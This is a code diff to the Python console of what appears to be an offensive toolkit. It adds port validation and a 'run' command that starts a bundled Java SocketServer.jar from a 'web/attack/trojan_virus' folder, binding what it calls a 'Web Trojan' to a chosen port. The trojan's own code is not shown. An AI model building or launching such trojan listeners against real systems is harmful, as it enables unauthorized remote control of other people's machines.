@@ -1,4 +1,5 @@
 import main as main
+import os
 
 
 class attack:
@@ -23,7 +24,7 @@ def setHost(host: str):
     attack.connect = host
 
 
-def web_control_console(payload: str):
+def web_control_console(payload: str,jre: str,runPath: str):
     print()
     print("Enter 'show options' show all the options you must be write.")
     print("Enter 'set [VALUE] [CONTENT]' set the attack value.")
@@ -46,16 +47,22 @@ def web_control_console(payload: str):
                 """)
 
             if command.startswith("set port "):
-                port: int = int(command[len("set port "):len(command)])
-                attack.port = port
+                try:
+                    port: int = int(command[len("set port "):len(command)])
+                    attack.port = port
+                except:
+                    print("INPUT PORT MUST BE 'INT' TYPE")
+                    continue
 
             if command == 'exit':
                 break
 
             if command == 'run':
-                os.system("")
-
-        except:
+                #print(jre)
+                print("The Web Trojan was bind in this host's "+str(attack.port)+" port.")
+                # print("cd "+runPath+"/../Module/web/attack/trojan_virus/ && "+jre+" -jar SocketServer.jar "+str(attack.port))
+                os.system("cd "+runPath+"/../Module/web/attack/trojan_virus/SocketServer/bin/ && "+jre+" -jar SocketServer.jar "+str(attack.port))
+        except BaseException:
             continue
 
     main.main()
